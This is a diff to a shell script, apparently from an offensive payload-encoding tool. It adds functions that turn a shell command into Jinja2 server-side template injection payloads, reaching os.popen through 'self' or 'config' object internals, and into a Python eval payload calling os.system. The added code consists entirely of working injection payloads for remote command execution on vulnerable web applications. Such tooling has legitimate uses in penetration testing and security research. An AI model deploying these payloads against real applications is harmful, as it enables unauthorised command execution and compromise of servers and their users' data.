@@ -29,6 +29,28 @@ encode_python_payload() {
     echo "$payload"
 }
 
+encode_jinja_payload() {
+    local payload="$1"
+    if [[ -z $payload_type ]]; then
+        payload_type="self"
+    fi
+    if [[ $payload_type == "self" ]]; then
+        payload="{{ self.__init__.__globals__.__builtins__.__import__('os').popen('$payload').read() }}"
+    elif [[ $payload_type == "config" ]]; then
+        payload="{{ config.__class__.__init__.__globals__['os'].popen('$payload').read() }}"
+    else
+        echo "Invalid payload type: $payload_type"
+        return 1
+    fi
+    echo "$payload"
+}
+
+encode_python_eval() {
+    local payload="$1"
+    payload="__import__('os').system('$payload')"
+    echo "$payload"
+}
+
 encode_space() {
     if [[ ! -z $encode_space ]] && [[ $encode_space == true ]]; then
         payload=$(encode_space_ifs "$payload")
